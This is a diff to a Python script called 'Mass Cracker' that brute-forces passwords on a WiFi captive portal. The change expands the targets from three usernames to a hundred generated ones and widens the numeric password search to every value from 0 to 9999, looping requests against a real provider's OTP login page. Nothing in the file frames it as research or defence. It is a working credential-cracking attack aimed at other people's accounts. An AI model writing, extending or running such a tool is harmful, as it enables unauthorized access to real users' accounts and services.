@@ -1,6 +1,12 @@
 import requests
 import json
 
+base_url = 'http://10.201.21.1'
+usernames = []
+for i in range(100):
+    usernames.append("23TSFBA"+f'{i:03}')
+print(usernames)
+
 def logged_in(password_str=-1):
     status_response = requests.get(base_url, allow_redirects=False)
 
@@ -34,10 +40,8 @@ def load_passwords_data():
 
 
 # Define the base URL
-base_url = 'http://10.201.21.1'
 
 # Define the range of usernames
-usernames = ["23TSFBA023", "23TSFBA035", "23TSFBA021"]
 
 print("Welcome to Mass Cracker!")
 
@@ -46,7 +50,7 @@ for username in usernames:
     logout()
     print(f"Finding password for: {username}\n\n")
     # Loop over the range of passwords
-    for password in range(1980, 10000):
+    for password in range(0, 10000):
         # First POST request
         otp_url = 'http://wifiunify38.spectra.co/userportal/pages/usermedia/spectra3/stanza-disable-random-mac/otp.jsp'
         otp_data = {
